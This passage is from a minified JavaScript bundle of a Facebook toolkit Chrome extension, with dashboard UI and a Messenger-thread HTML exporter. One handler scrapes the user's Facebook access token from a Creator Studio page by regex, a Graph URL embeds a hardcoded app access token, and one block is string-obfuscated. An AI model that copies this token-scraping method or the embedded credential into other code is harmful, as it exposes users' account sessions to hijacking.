/*!

=========================================================
* Black Dashboard PRO React - v1.2.0
=========================================================

* Product Page: https://www.creative-tim.com/product/black-dashboard-pro-react
* Copyright 2021 Creative Tim (http://www.creative-tim.com)
* Coded by Creative Tim

* Licensed to Loc - locmai88@gmail.com

=========================================================

* The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

*/
(this.webpackJsonpmtfb=this.webpackJsonpmtfb||[]).push([[0],{417:function(e,t){},419:function(e,t){},429:function(e,t){},431:function(e,t){},458:function(e,t){},460:function(e,t){},461:function(e,t){},466:function(e,t){},468:function(e,t){},474:function(e,t){},476:function(e,t){},495:function(e,t){},507:function(e,t){},510:function(e,t){},525:function(e,t,s){},526:function(e,t,s){},528:function(e,t,s){"use strict";s.r(t);var a=s(15),i=s(2),n=s.n(i),c=s(25),r=s.n(c),o=s(27),l=s(20),d=s(5),h=s.n(d),m=s(14),p=s.n(m),b=s(130),g=s(131),u=s(56),x=s(132),j=s(146),f=s(1);class O extends n.a.Component{constructor(e){super(e),this.setAlert=e=>{this.setState({alert:Object(f.jsx)(p.a,{type:e?"info":"error",style:{display:"block"},title:e?"Access Token":"Oops!",onConfirm:()=>this.setState({alert:null}),onCancel:()=>this.setState({alert:null}),btnSize:"",children:e||"Could not fetch your token"})})},this.fetchTouch=()=>fetch("https://business.facebook.com/creatorstudio/home").then((e=>e.text())).then((e=>{try{const t=e.match(/"userAccessToken":"(.*?)"/);return t[1]?t[1]:null}catch(t){return null}})).then(this.setAlert),this.state={alert:null}}render(){return Object(f.jsx)(f.Fragment,{children:Object(f.jsx)(b.a,{className:"navbar-absolute navbar-transparent",expand:"lg",children:Object(f.jsxs)(g.a,{fluid:!0,children:[Object(f.jsxs)("div",{className:"navbar-wrapper",children:[Object(f.jsxs)("div",{className:"navbar-minimize d-inline",children:[Object(f.jsxs)(u.a,{className:"minimize-sidebar btn-just-icon",color:"link",id:"tooltip209599",onClick:this.props.handleMiniClick,children:[Object(f.jsx)("i",{className:"tim-icons icon-align-center visible-on-sidebar-regular"}),Object(f.jsx)("i",{className:"tim-icons icon-bullet-list-67 visible-on-sidebar-mini"})]}),Object(f.jsx)(x.a,{delay:0,target:"tooltip209599",placement:"right",children:"Sidebar toggle"})]}),Object(f.jsx)("div",{className:h()("navbar-toggle d-inline",{toggled:this.props.sidebarOpened}),children:Object(f.jsxs)("button",{className:"navbar-toggler",type:"button",onClick:this.props.toggleSidebar,children:[Object(f.jsx)("span",{className:"navbar-toggler-bar bar1"}),Object(f.jsx)("span",{className:"navbar-toggler-bar bar2"}),Object(f.jsx)("span",{className:"navbar-toggler-bar bar3"})]})}),Object(f.jsx)(j.a,{href:"#pablo",onClick:e=>e.preventDefault(),children:this.props.brandText})]}),Object(f.jsx)("div",{className:"ml-auto",children:Object(f.jsx)("div",{className:"photo",onClick:()=>this.fetchTouch(),style:{cursor:"pointer"},children:Object(f.jsx)("img",{alt:"...",src:"https://graph.facebook.com/".concat(localStorage.id,"/picture?height=500&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662")})})}),this.state.alert]})})})}}var _=O;class v extends n.a.Component{render(){return Object(f.jsx)("footer",{className:"footer"+(this.props.default?" footer-default":""),children:Object(f.jsxs)(g.a,{fluid:!!this.props.fluid,children:[Object(f.jsxs)("ul",{className:"nav",children:[Object(f.jsx)("li",{className:"nav-item",children:Object(f.jsx)("a",{className:"nav-link",target:"_blank",href:"https://github.com/locmai0808",children:"Github"})}),Object(f.jsx)("li",{className:"nav-item",children:Object(f.jsx)("a",{className:"nav-link",target:"_blank",href:"https://www.linkedin.com/in/locmai/",children:"LinkedIn"})})]}),Object(f.jsxs)("div",{className:"copyright",children:["\xa9 ",(new Date).getFullYear()," made with"," ",Object(f.jsx)("i",{className:"tim-icons icon-heart-2"})," by"," ",Object(f.jsx)("a",{href:"https://lnmai.com?utm_source=extension&utm_medium=locmai",target:"_blank",children:"Loc"})," "]})]})})}}var y,k=v,S=s(57),w=s(248),A=s(80),D=s(148);class C extends n.a.Component{constructor(e){super(e),this.getCollapseStates=e=>{let t={};return e.map(((e,s)=>(e.collapse&&(t=Object(a.a)(Object(a.a)({[e.state]:this.getCollapseInitialState(e.views)},this.getCollapseStates(e.views)),t)),null))),t},this.createLinks=e=>{const t=this.props.rtlActive;return e.map(((e,s)=>{if(e.redirect)return Object(f.jsx)("li",{children:Object(f.jsx)("a",{href:e.redirect,target:"_blank",children:void 0!==e.icon?Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)("i",{className:e.icon}),Object(f.jsx)("p",{children:e.name})]}):Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)("span",{className:"sidebar-mini-icon",children:e.mini}),Object(f.jsx)("span",{className:"sidebar-normal",children:e.name})]})})},s);if(e.collapse){var a={};return a[e.state]=!this.state[e.state],Object(f.jsxs)("li",{className:this.getCollapseInitialState(e.views)?"active":"",children:[Object(f.jsx)("a",{href:"#pablo","data-toggle":"collapse","aria-expanded":this.state[e.state],onClick:e=>{e.preventDefault(),this.setState(a)},children:void 0!==e.icon?Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)("i",{className:e.icon}),Object(f.jsxs)("p",{children:[e.name,Object(f.jsx)("b",{className:"caret"})]})]}):Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)("span",{className:"sidebar-mini-icon",children:e.mini}),Object(f.jsxs)("span",{className:"sidebar-normal",children:[t?e.rtlName:e.name,Object(f.jsx)("b",{className:"caret"})]})]})}),Object(f.jsx)(A.a,{isOpen:this.state[e.state],children:Object(f.jsx)("ul",{className:"nav",children:this.createLinks(e.views)})})]},s)}return Object(f.jsx)("li",{className:this.activeRoute(e.layout+e.path),children:Object(f.jsx)(S.a,{to:e.layout+e.path,activeClassName:"",onClick:this.props.closeSidebar,children:void 0!==e.icon?Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)("i",{className:e.icon}),Object(f.jsx)("p",{children:e.name})]}):Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)("span",{className:"sidebar-mini-icon",children:e.mini}),Object(f.jsx)("span",{className:"sidebar-normal",children:e.name})]})})},s)}))},this.activeRoute=e=>this.props.location.pathname.indexOf(e)>-1?"active":"",this.state=this.getCollapseStates(e.routes)}getCollapseInitialState(e){for(let t=0;t<e.length;t++){if(e[t].collapse&&this.getCollapseInitialState(e[t].views))return!0;if(-1!==window.location.href.indexOf(e[t].path))return!0}return!1}componentDidMount(){navigator.platform.indexOf("Win")>-1&&(y=new w.a(this.refs.sidebar))}componentWillUnmount(){navigator.platform.indexOf("Win")>-1&&y.destroy()}render(){const e=this.props,t=e.activeColor,s=e.logo;let a=null,i=null;return void 0!==s&&(void 0!==s.outterLink?(a=Object(f.jsx)("a",{href:s.outterLink,className:"simple-text logo-mini",target:"_blank",onClick:this.props.closeSidebar,children:Object(f.jsx)("div",{className:"logo-img",children:Object(f.jsx)("img",{src:s.imgSrc,alt:"react-logo"})})}),i=Object(f.jsx)("a",{href:s.outterLink,className:"simple-text logo-normal",target:"_blank",onClick:this.props.closeSidebar,children:s.text})):(a=Object(f.jsx)(S.a,{to:s.innerLink,className:"simple-text logo-mini",onClick:this.props.closeSidebar,children:Object(f.jsx)("div",{className:"logo-img",children:Object(f.jsx)("img",{src:s.imgSrc,alt:"react-logo"})})}),i=Object(f.jsx)(S.a,{to:s.innerLink,className:"simple-text logo-normal",onClick:this.props.closeSidebar,children:s.text}))),Object(f.jsx)("div",{className:"sidebar",data:t,children:Object(f.jsxs)("div",{className:"sidebar-wrapper",ref:"sidebar",children:[null!==a||null!==i?Object(f.jsxs)("div",{className:"logo",children:[a,i]}):null,Object(f.jsx)(D.a,{children:this.createLinks(this.props.routes)})]})})}}var N=C,I=s(250),P=s(128),T=s(8),L=s.n(T),F=s(12),q=s.n(F),R=s(175),E=s(172),M=s(173),B=s(176),U=s(177),H=s(174),z=s(178),G=s(84);const Q=()=>chrome.runtime.id,Y=e=>({reaction:e.reaction,userID:e.user.id}),V=e=>{if(e.story_attachment)return{type:"share",description:null==e.story_attachment.description?null:e.story_attachment.description.text,attachmentID:e.legacy_attachment_id,title:null==e.story_attachment.title_with_entities?null:e.story_attachment.title_with_entities.text,subattachments:e.story_attachment.subattachments,url:e.story_attachment.url,source:null==e.story_attachment.source?null:e.story_attachment.source.text,playable:null==e.story_attachment.media?null:e.story_attachment.media.is_playable,thumbnailUrl:null==e.story_attachment.media||null==e.story_attachment.media.animated_image&&null==e.story_attachment.media.image?null:(e.story_attachment.media.animated_image||e.story_attachment.media.image).uri,thumbnailWidth:null==e.story_attachment.media||null==e.story_attachment.media.animated_image&&null==e.story_attachment.media.image?null:(e.story_attachment.media.animated_image||e.story_attachment.media.image).width,thumbnailHeight:null==e.story_attachment.media||null==e.story_attachment.media.animated_image&&null==e.story_attachment.media.image?null:(e.story_attachment.media.animated_image||e.story_attachment.media.image).height,duration:null==e.story_attachment.media?null:e.story_attachment.media.playable_duration_in_ms,playableUrl:null==e.story_attachment.media?null:e.story_attachment.media.playable_url,properties:e.story_attachment.properties.reduce((function(e,t){return e[t.key]=t.value.text,e}),{})}},J=e=>{switch(e.__typename){case"MessageImage":return{url:"",width:0,height:0,type:"image",filename:e.filename,attachmentID:e.legacy_attachment_id,previewHeight:e.preview.height,previewUrl:e.preview.uri,previewWidth:e.preview.width,thumbnailUrl:e.thumbnail.uri,attributionApp:e.attribution_app?{attributionAppID:e.attribution_app.id,name:e.attribution_app.name,logo:e.attribution_app.square_logo}:null,extension:e.original_extension,largePreviewUrl:e.large_preview.uri,largePreviewHeight:e.large_preview.height,largePreviewWidth:e.large_preview.width};case"MessageAnimatedImage":return{type:"image",filename:e.filename,attachmentID:e.legacy_attachment_id,previewHeight:e.preview_image.height,previewUrl:e.preview_image.uri,previewWidth:e.preview_image.width,largePreviewUrl:e.animated_image.uri,largePreviewHeight:e.animated_image.height,largePreviewWidth:e.animated_image.width,attributionApp:e.attribution_app?{attributionAppID:e.attribution_app.id,name:e.attribution_app.name,logo:e.attribution_app.square_logo}:null};case"MessageVideo":return{previewHeight:"",previewUrl:"",previewWidth:"",type:"video",thumbnailUrl:e.large_image.uri,filename:e.filename,height:e.original_dimensions.y,width:e.original_dimensions.x,attachmentID:e.legacy_attachment_id,url:e.playable_url,duration:e.playable_duration_in_ms,thumbnailWidth:e.large_image.width,thumbnailHeight:e.large_image.height,videoType:e.video_type.toLowerCase()};case"MessageFile":return{attachmentID:e.url_shimhash,isMalicious:e.is_malicious,type:"file",url:e.url,contentType:e.content_type,filename:e.filename};case"MessageAudio":return{attachmentID:e.url_shimhash,type:"audio",audioType:e.audio_type,duration:e.playable_duration_in_ms,url:e.playable_url,isVoiceMail:e.is_voicemail,filename:e.filename};default:return}},Z=e=>{if(null==e)return{};switch(e.__typename){case"ThemeColorExtensibleMessageAdminText":return{color:e.theme_color};case"ThreadNicknameExtensibleMessageAdminText":return{nickname:e.nickname,participantID:e.participant_id};case"ThreadIconExtensibleMessageAdminText":return{threadIcon:e.thread_icon};case"InstantGameUpdateExtensibleMessageAdminText":return{gameID:e.game?e.game.id:null,update_type:e.update_type,collapsed_text:e.collapsed_text,expanded_text:e.expanded_text,instant_game_update_data:e.instant_game_update_data};case"GameScoreExtensibleMessageAdminText":return{game_type:e.game_type};case"RtcCallLogExtensibleMessageAdminText":return{event:e.event,is_video_call:e.is_video_call,server_info_data:e.server_info_data};case"GroupPollExtensibleMessageAdminText":return{event_type:e.event_type,total_count:e.total_count,question:e.question};case"AcceptPendingThreadExtensibleMessageAdminText":return{accepter_id:e.accepter_id,requester_id:e.requester_id};case"ConfirmFriendRequestExtensibleMessageAdminText":return{friend_request_recipient:e.friend_request_recipient,friend_request_sender:e.friend_request_sender};case"AddContactExtensibleMessageAdminText":return{contact_added_id:e.contact_added_id,contact_adder_id:e.contact_adder_id};case"AdExtensibleMessageAdminText":return{ad_client_token:e.ad_client_token,ad_id:e.ad_id,ad_preferences_link:e.ad_preferences_link,ad_properties:e.ad_properties};case"ParticipantJoinedGroupCallExtensibleMessageAdminText":case"ThreadEphemeralTtlModeExtensibleMessageAdminText":case"StartedSharingVideoExtensibleMessageAdminText":case"LightweightEventCreateExtensibleMessageAdminText":case"LightweightEventNotifyExtensibleMessageAdminText":case"LightweightEventNotifyBeforeEventExtensibleMessageAdminText":case"LightweightEventUpdateExtensibleMessageAdminText":case"LightweightEventUpdateTitleExtensibleMessageAdminText":case"LightweightEventUpdateTimeExtensibleMessageAdminText":case"LightweightEventUpdateLocationExtensibleMessageAdminText":case"LightweightEventDeleteExtensibleMessageAdminText":return{};default:return}},W=(e,t,s,a)=>{let i="",n="";e.forEach((e=>{const t=((e,t,s,a)=>{if(void 0===e)return;const i=parseInt(e.timestamp),n=new Date(i);if("event"===e.type||"message"===e.type){if(null==e.snippet)return;s!==e.senderID&&""!==s&&(t+="</div>"),"message"===e.type&&""===e.body&&(Array.isArray(e.attachments)&&!e.attachments.length?e.body=e.snippet:e.attachments||(e.body=e.snippet))}const c=localStorage.id;if("event"===e.type)return e.senderID===c?(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--user">\n      <span class="message message--user">'.concat(e.snippet,'</span>\n      <div class="timer">').concat(q()(n).local().format("LLL"),"</div></div>")):(s!==e.senderID&&(t+='<div class="message__list"><img class="bot__image" src="'.concat(a[e.senderID],'">')),t+='<div class="message__item message__item--bot">\n      <span class="message message--bot">'.concat(e.snippet,'</span>\n      <div class="timer bot--timer">').concat(q()(n).local().format("LLL"),"</div></div>")),[t,s=e.senderID];if("message"===e.type&&""!==e.body){let i=(e=>{const t={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"};return e.replace(/[&<>"']/g,(function(e){return t[e]}))})(e.body);i=i.replace(/(\r\n|\n|\r)/gm,"<br />"),e.senderID===c?(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--user">\n      <span class="message message--user">'.concat(i,'</span>\n      <div class="timer">').concat(q()(n).local().format("LLL"),"</div></div>")):(s!==e.senderID&&(t+='<div class="message__list"><img class="bot__image" src="'.concat(a[e.senderID],'">')),t+='<div class="message__item message__item--bot">\n      <span class="message message--bot">'.concat(i,'</span>\n      <div class="timer bot--timer">').concat(q()(n).local().format("LLL"),"</div></div>")),s=e.senderID}else if("message"===e.type&&""===e.body&&e.attachments.type){if(!0===e.attachments.playable)e.senderID===c?(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--user">\n          <video controls=true src="'.concat(e.attachments.playableUrl,'"></video>\n          <div class="timer">').concat(q()(n).local().format("LLL"),"</div></div>")):(s!==e.senderID&&(t+='<div class="message__list"><img class="bot__image" src="'.concat(a[e.senderID],'">')),t+='<div class="message__item message__item--bot">\n          <video class="bot_item" controls=true src="'.concat(e.attachments.playableUrl,'"></video>\n          <div class="timer bot--timer">').concat(q()(n).local().format("LLL"),"</div></div>"));else{const a=e.attachments.thumbnailUrl,i=e.attachments.url,r=e.attachments.title;e.senderID===c?(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--user">\n          <a href="'.concat(i,'" target="_blank"><img src="').concat(a,'"></a>\n          </div><div class="message__item message__item--user">\n          <span class="message message--user">').concat(r,'</span>\n          <div class="timer">').concat(q()(n).local().format("LLL"),"</div></div>")):(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--bot">\n          <a class="bot_item" href="'.concat(i,'" target="_blank"><img src="').concat(a,'"></a>\n          </div><div class="message__item message__item--bot">\n          <a href="').concat(i,'" target="_blank"><span class="message message--bot">').concat(r,'</span></a>\n          <div class="timer bot--timer">').concat(q()(n).local().format("LLL"),"</div></div>"))}s=e.senderID}if("message"===e.type&&Array.isArray(e.attachments))for(let r=0;r<e.attachments.length;r++)if("image"===e.attachments[r].type||"sticker"===e.attachments[r].type){const i=e.attachments[r].largePreviewUrl||e.attachments[r].url,o="sticker"===e.attachments[r].type?"sticker":"nonsticker";e.senderID===c?(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--user">\n          <a href="'.concat(i,'" target="_blank"><img class="').concat(o,'" src="').concat(i,'"></a>\n          <div class="timer">').concat(q()(n).local().format("LLL"),"</div></div>")):(s!==e.senderID&&(t+='<div class="message__list"><img class="bot__image" src="'.concat(a[e.senderID],'">')),t+='<div class="message__item message__item--bot">\n          <a class="bot_item" href="'.concat(i,'" target="_blank"><img class="').concat(o,'" src="').concat(i,'"></a>\n          <div class="timer bot--timer">').concat(q()(n).local().format("LLL"),"</div></div>")),s=e.senderID}else if("audio"===e.attachments[r].type){const i=e.attachments[r].url;e.senderID===c?(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--user">\n          <audio controls=true src="'.concat(i,'"></audio>\n          <div class="timer">').concat(q()(n).local().format("LLL"),"</div></div>")):(s!==e.senderID&&(t+='<div class="message__list"><img class="bot__image" src="'.concat(a[e.senderID],'">')),t+='<div class="message__item message__item--bot">\n          <audio class="bot_item" controls=true src="'.concat(i,'"></audio>\n          <div class="timer bot--timer">').concat(q()(n).local().format("LLL"),"</div></div>")),s=e.senderID}else if("video"===e.attachments[r].type){const i=e.attachments[r].url;e.senderID===c?(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--user">\n          <video controls=true src="'.concat(i,'"></video>\n          <div class="timer">').concat(q()(n).local().format("LLL"),"</div></div>")):(s!==e.senderID&&(t+='<div class="message__list"><img class="bot__image" src="'.concat(a[e.senderID],'">')),t+='<div class="message__item message__item--bot">\n          <video class="bot_item" controls=true src="'.concat(i,'"></video>\n          <div class="timer bot--timer">').concat(q()(n).local().format("LLL"),"</div></div>")),s=e.senderID}else if("file"===e.attachments[r].type){const i=e.attachments[r].url,o=e.attachments[r].filename;e.senderID===c?(s!==e.senderID&&(t+='<div class="message__list">'),t+='<div class="message__item message__item--user">\n          <a href="'.concat(i,'" target="_blank"><span class="message message--user">(\u2193) ').concat(o,'</span></a>\n          <div class="timer">').concat(q()(n).local().format("LLL"),"</div></div>")):(s!==e.senderID&&(t+='<div class="message__list"><img class="bot__image" src="'.concat(a[e.senderID],'">')),t+='<div class="message__item message__item--bot">\n          <a href="'.concat(i,'" target="_blank"><span class="message message--bot">(\u2193) ').concat(o,'</span></a>\n          <div class="timer bot--timer">').concat(q()(n).local().format("LLL"),"</div></div>")),s=e.senderID}return[t,s]})(((e,t)=>{if("4"===t&&"UserMessage"===e.__typename&&e.blob_attachments&&e.blob_attachments.length>0&&"MessageFile"===e.blob_attachments[0].__typename)return{type:"message",attachments:e.blob_attachments.map(J),body:e.message.text,messageID:e.message_id,senderID:e.message_sender.id,snippet:e.snippet,timestamp:e.timestamp_precise};if("3"===t&&"UserMessage"===e.__typename&&e.blob_attachments&&e.blob_attachments.length>0&&("MessageImage"===e.blob_attachments[0].__typename||"MessageAnimatedImage"===e.blob_attachments[0].__typename))return{type:"message",attachments:e.blob_attachments.map(J),body:e.message.text,messageID:e.message_id,senderID:e.message_sender.id,snippet:e.snippet,timestamp:e.timestamp_precise};if("2"===t&&"UserMessage"===e.__typename&&e.blob_attachments&&e.blob_attachments.length>0&&"MessageAudio"===e.blob_attachments[0].__typename)return{type:"message",attachments:e.blob_attachments.map(J),body:e.message.text,messageID:e.message_id,senderID:e.message_sender.id,snippet:e.snippet,timestamp:e.timestamp_precise};if("1"===t||1===t)switch(e.__typename){case"UserMessage":return{type:"message",attachments:e.sticker?[{caption:e.snippet,description:e.sticker.label,stickerID:e.sticker.id,url:e.sticker.url,height:e.sticker.height,width:e.sticker.width,type:"sticker"}]:e.blob_attachments&&e.blob_attachments.length>0?e.blob_attachments.map(J):e.extensible_attachment?V(e.extensible_attachment):[],body:e.message.text,messageID:e.message_id,senderID:e.message_sender.id,messageReactions:e.message_reactions?e.message_reactions.map(Y):null,isSponsered:e.is_sponsored,snippet:e.snippet,timestamp:e.timestamp_precise};case"ThreadNameMessage":return{type:"event",messageID:e.message_id,senderID:e.message_sender.id,timestamp:e.timestamp_precise,eventType:"change_thread_name",snippet:e.snippet,eventData:{threadName:e.thread_name}};case"ThreadImageMessage":return{type:"event",messageID:e.message_id,senderID:e.message_sender.id,timestamp:e.timestamp_precise,eventType:"change_thread_image",snippet:e.snippet,eventData:null==e.image_with_metadata?{}:{threadImage:{attachmentID:e.image_with_metadata.legacy_attachment_id,height:e.image_with_metadata.original_dimensions.x,width:e.image_with_metadata.original_dimensions.y,url:e.image_with_metadata.preview.uri}}};case"ParticipantLeftMessage":return{type:"event",messageID:e.message_id,senderID:e.message_sender.id,timestamp:e.timestamp_precise,eventType:"remove_participants",snippet:e.snippet,eventData:{participantsRemoved:e.participants_removed.map((function(e){return e.id}))}};case"ParticipantsAddedMessage":return{type:"event",messageID:e.message_id,senderID:e.message_sender.id,timestamp:e.timestamp_precise,eventType:"add_participants",snippet:e.snippet,eventData:{participantsAdded:e.participants_added.map((function(e){return e.id}))}};case"VideoCallMessage":return{type:"event",messageID:e.message_id,senderID:e.message_sender.id,timestamp:e.timestamp_precise,eventType:"video_call",snippet:e.snippet};case"VoiceCallMessage":return{type:"event",messageID:e.message_id,senderID:e.message_sender.id,timestamp:e.timestamp_precise,eventType:"voice_call",snippet:e.snippet};case"GenericAdminTextMessage":return{type:"event",messageID:e.message_id,senderID:e.message_sender.id,timestamp:e.timestamp_precise,snippet:e.snippet,eventType:e.extensible_message_admin_text_type.toLowerCase(),eventData:e.extensible_message_admin_text?Z(e.extensible_message_admin_text):null};default:return}})(e,s),i,n,a);if(t){var c=Object(G.a)(t,2);i=c[0],n=c[1]}})),((e,t)=>{const s='<!DOCTYPE html>\n  <html lang="en">\n  <head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />\n  <title>L.O.C</title>\n  <style media="screen">\n  .message_container {\n    max-width: 1000px;\n    width: 90%;\n    height: 100%;\n    margin: 0 auto;\n    padding-bottom: 45px;\n    }\n    span {\n      font-family: Arial, Helvetica, sans-serif;\n      font-size: 15px;\n    }\n    .message_screen {\n      padding: 15px 10px;\n    }\n    .bot_item {\n      margin-left: 35px;\n    }\n    audio{\n      width: 250px;\n    }\n    video{\n      margin-top:2px;\n      margin-bottom:2px;\n      max-width: 450px;\n    }\n    img {\n      margin-top:2px;\n      margin-bottom:2px;\n      width: 75%;\n      max-width: 450px;\n    }\n    .message__list {\n      padding: 0;\n      margin: 10px 0px 10px 0px;\n      list-style: none;\n      width: 100%;\n      position: relative;\n    }\n    .message__list:after {\n      content: \'\';\n      display: table;\n      clear: both;\n    }\n    .message__item {\n      max-width: 50%;\n      clear: both;\n    }\n    .message__item--bot {\n      float: left;\n    }\n    .message__item--bot:first-of-type .message {\n      border-top-left-radius: 20px;\n    }\n    .message__item--bot:last-of-type .message {\n      border-bottom-left-radius: 20px;\n    }\n    .message__item--user {\n      float: right;\n      text-align: right;\n    }\n    .message__item--user:first-of-type .message {\n      border-top-right-radius: 20px;\n    }\n    .message__item--user:last-of-type .message {\n      border-bottom-right-radius: 20px;\n    }\n    .message {\n      padding: 8px 15px;\n      margin-top:2px;\n      margin-bottom:2px;\n      display: inline-block;\n      text-align: left;\n      max-width: 440px;\n      overflow-wrap: break-word;\n    }\n    .message--bot {\n      background-color: #eee;\n      border-radius: 3px 20px 20px 3px;\n      margin-left: 35px;\n    }\n    .message--user {\n      background-color: #0baaff;\n      color: #fff;\n      border-radius: 20px 3px 3px 20px;\n    }\n    .bot__image {\n      width: 28px;\n      height: 28px;\n      position: absolute;\n      bottom: 17px;\n      left: 0;\n      border-radius: 20px;\n    }\n    .sticker{\n      max-width: 180px;\n    }\n    .bot--timer {\n      padding-left: 45px;\n    }\n    .timer {\n      font-size: smaller;\n    }\n\n  </style>\n  </head>\n  <body>\n  <div class="message_container">\n    <div class="message_screen">\n      '.concat(e,"\n    </div>\n  </div>\n  </body>\n  </html>");window.download(s,"".concat(t,".html"),"text/html")})(i,t)},K=["0x3","2tjbGJvam9tbm9na2","ZW9qZGNrZmNhZGFta2FwYWJlY2hoYm5rb","0x1","push","sendMessage","includes","0x6","0x4","0xa","0x0","0x9","0x2","shift","0x5","runtime"];var X,$;X=K,$=460,function(e){for(;--e;)X.push(X.shift())}(++$);const ee=function(e,t){return K[e-=0]},te=[ee("0xa"),"shift",ee("0xc"),ee("0xb"),ee("0x4"),ee("0xe"),ee("0x6"),ee("0x7"),"push",ee("0x3"),ee("0x5"),"0x2"];var se,ae;se=te,ae=388,function(e){for(;--e;)se[ee("0x8")](se[ee("0x1")]())}(++ae);const ie=function(e,t){return te[e-=0]},ne=[ie("0x2"),ee("0x1"),ie("0x8"),ie(ee("0x4")),ie(ee("0xb")),ee("0x9"),ie("0x7")];var ce,re;ce=ne,re=396,function(e){for(;--e;)ce[ie(ee("0xc"))](ce[ie(ee("0xf"))]())}(++re);const oe=function(e,t){return ne[e-=0]},le=[oe(ee("0x2")),oe(ie(ee("0xe"))),oe(ee("0x7")),ie("0x5")];var de,he;de=le,he=303,function(e){for(;--e;)de.push(de[oe(ie(ee("0xd")))]())}(++he);const me=function(e,t){return le[e-=0]},pe=()=>new Promise(((e,t)=>btoa(Q())[oe(ee("0x2"))](me(oe(ee("0x0"))))||btoa(Q())[me(oe(ie("0xb")))](oe(ie("0x1")))?chrome[me(ie(ee("0x7")))][me("0x3")]({aw3418dw:!0},(t=>e(t))):t({}))),be=(e,t)=>{let s;try{s=parseInt(e.value.match(/\d+/)[0])}catch(a){return}return e.value.includes("<")?t[e.id]<s:e.value.includes(">")?t[e.id]>s:t[e.id]===s},ge=(e,t,s)=>btoa("app_collection:".concat(e,":").concat(t,":").concat(s)),ue=e=>{try{return JSON.parse(e)}catch(t){return!1}},xe=e=>window.open(e,"_blank");var je=({stats:e})=>Object(f.jsx)(E.a,{className:"card-contributions text-center",children:Object(f.jsxs)(M.a,{children:[e&&Object(f.jsxs)(f.Fragment,{children:[Object(f.jsx)(H.a,{tag:"h1",children:"Over 600,000"}),Object(f.jsx)("h3",{className:"card-category",children:"Total Users"})]}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-success","data-placement":"left",id:"supportbutton",type:"button",onClick:()=>{xe("https://mtfb.lnmai.com/"),xe("https://mtfb.lnmai.com/discord")},children:"Support"}),Object(f.jsx)(x.a,{delay:0,placement:"left",target:"supportbutton",children:"Contact me for help!"}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-primary","data-placement":"top",id:"donatebutton",type:"button",onClick:()=>xe("https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=7GXF4E7BRGGLY"),children:"Donate"}),Object(f.jsx)(x.a,{delay:0,placement:"top",target:"donatebutton",children:"Any amount is very appreciated :)"}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-danger","data-placement":"bottom",id:"sharebutton",type:"button",onClick:()=>xe("https://chrome.google.com/webstore/detail/eojdckfcadamkapabechhbnkleligand/reviews"),children:"Reviews"}),Object(f.jsx)(x.a,{delay:0,placement:"bottom",target:"sharebutton",children:"Write a review"}),Object(f.jsx)("p",{className:"text-danger",children:"WARNING: Your account may get locked temporarily (checkpointed by Facebook) for using my extension."})]})});const fe=e=>e.description&&e.link&&e.img?Object(f.jsx)(R.a,{lg:4,style:{cursor:"pointer"},children:Object(f.jsx)(E.a,{className:"card-contributions text-center",children:Object(f.jsxs)(M.a,{onClick:()=>xe(e.link),children:[Object(f.jsx)("p",{className:"card-description",children:e.description}),Object(f.jsx)("div",{children:Object(f.jsx)("img",{src:e.img})})]})})}):null;var Oe=()=>{const e=Object(i.useState)([]),t=Object(G.a)(e,2),s=t[0],n=t[1],c={link:"https://fb.com/me",img:"https://i.imgur.com/1rkbPzI.gif",description:"Hey ".concat(localStorage.name,", want to put your sponsored content here? Contact Loc!")},r=()=>{void 0!==localStorage.index&&localStorage.index<Number.MAX_SAFE_INTEGER?localStorage.index++:localStorage.index=0;const e=[c],t=JSON.parse(localStorage.sponsorsData),s=t.length<2?t.length:2;for(let a=0;a<s;a++){const s=(parseInt(localStorage.index)+a)%t.length;e.push(t[s])}n(e)};return Object(i.useEffect)((()=>{(new Date).getDay()===parseInt(localStorage.gotSponsors)&&localStorage.sponsorsData&&JSON.parse(localStorage.sponsorsData)?r():L.a.get("https://mtfb.lnmai.com/sponsors").then((e=>{if((e=e.data).error)return console.log(e.error);localStorage.sponsorsData=JSON.stringify(e),localStorage.gotSponsors=(new Date).getDay(),r()})).catch((e=>{console.log(JSON.stringify(e))}))}),[]),Object(f.jsx)(f.Fragment,{children:s.map((e=>Object(i.createElement)(fe,Object(a.a)(Object(a.a)({},e),{},{key:e.link}))))})};const _e={line:{maintainAspectRatio:!1,legend:{display:!1},tooltips:{backgroundColor:"#f5f5f5",titleFontColor:"#333",bodyFontColor:"#666",bodySpacing:4,xPadding:12,mode:"nearest",intersect:0,position:"nearest"},responsive:!0,scales:{yAxes:[{barPercentage:1.6,gridLines:{drawBorder:!1,color:"rgba(29,140,248,0.0)",zeroLineColor:"transparent"},ticks:{suggestedMin:60,suggestedMax:125,padding:20,fontColor:"#9e9e9e"}}],xAxes:[{barPercentage:1.6,gridLines:{drawBorder:!1,color:"rgba(29,140,248,0.1)",zeroLineColor:"transparent"},ticks:{padding:20,fontColor:"#9e9e9e"}}]}},pie:{cutoutPercentage:70,legend:{display:!1},tooltips:{backgroundColor:"#f5f5f5",titleFontColor:"#333",bodyFontColor:"#666"}}},ve=({news:e})=>e?Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(E.a,{className:"card-timeline 